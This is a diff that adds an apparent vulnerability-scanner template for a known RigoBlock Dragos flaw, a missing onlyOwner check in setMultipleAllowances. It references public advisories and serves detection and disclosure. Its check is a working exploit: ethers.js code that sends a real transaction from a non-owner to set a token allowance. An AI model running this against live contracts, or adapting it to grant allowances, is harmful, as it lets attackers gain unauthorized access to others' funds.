@@ -1,0 +1,61 @@
+﻿id: rigoblock-multiple-allowances-poc
+info:
+  name: RigoBlock setMultipleAllowances Unauthorized Manipulation
+  author: yunus
+  severity: high
+  description: |
+    RigoBlock Dragos contains a missing onlyOwner modifier in setMultipleAllowances
+    allowing arbitrary callers to modify allowances.
+  reference:
+    - https://raw.globalsecuritydatabase.org/GSD-2022-1000077
+    - https://twitter.com/RigoBlock/status/1494351180713050116
+    - https://twitter.com/danielvf/status/1494317265835147272
+  tags:
+    - blockchain
+    - smartcontract
+    - ethereum
+    - rigoblock
+
+metadata:
+  verified: true
+
+code:
+  - engine: ["evm"]
+    source: |
+      const targetAddress = "{{target}}";
+      const s = (typeof signer !== "undefined")
+        ? signer
+        : (typeof provider !== "undefined" ? provider.getSigner(0) : undefined);
+
+      if (!s) {
+        report({ vulnerable: false, error: "no signer/provider available in nuclei code engine" });
+      } else {
+        const contract = new ethers.Contract(targetAddress, [
+          "function setMultipleAllowances(address[] spenders, uint256[] values)"
+        ], s);
+
+        try {
+          const spenders = ["0x1000000000000000000000000000000000000000"];
+          const values = [999999999];
+          const tx = await contract.setMultipleAllowances(spenders, values);
+          const receipt = await tx.wait();
+
+          report({
+            vulnerable: true,
+            txHash: receipt.transactionHash,
+            message: `setMultipleAllowances executed by non-owner for spender ${spenders[0]} value ${values[0]}`
+          });
+        } catch (e) {
+          report({ vulnerable: false, error: String(e) });
+        }
+      }
+
+    matchers:
+      - type: word
+        part: result
+        words:
+          - "vulnerable"
+      - type: regex
+        part: result
+        regex:
+          - "0x[0-9a-fA-F]{64}"
